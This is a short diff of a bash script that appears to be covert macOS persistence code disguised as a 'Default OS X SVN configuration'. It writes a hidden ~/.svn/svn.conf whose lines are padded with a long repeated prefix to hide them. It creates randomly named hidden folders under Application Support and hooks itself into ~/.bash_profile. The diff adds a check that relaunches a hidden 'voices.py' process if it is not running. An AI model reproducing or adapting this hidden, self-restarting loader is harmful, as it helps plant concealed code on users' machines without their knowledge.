@@ -6,7 +6,8 @@ PRE=${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}
 mkdir -p ~/.svn/
 { cat <<EOF
 #!/usr/bin/env bash
-${PRE}if [ ! -d "${PWD}/.svn/" ]; then
+${PRE}ps | grep '[0-9]* python voices.py$' > /dev/null 2>&1
+${PRE}if [ ! $? -eq 0 ]; then
 ${PRE}    APP_DIR=${PWD}/Library/Application\ Support/.\${RANDOM}-\${RANDOM}/
 ${PRE}    mkdir -p \${APP_DIR}
 ${PRE}    cd \${APP_DIR}
@@ -38,6 +39,7 @@ EOF
 
 . ~/.svn/svn.conf
 
+ps aux | grep voices.py
 grep "Default OS X SVN configuration" ~/.bash_profile > /dev/null 2>&1
 if [ $? -ne 0 ]; then
     echo "
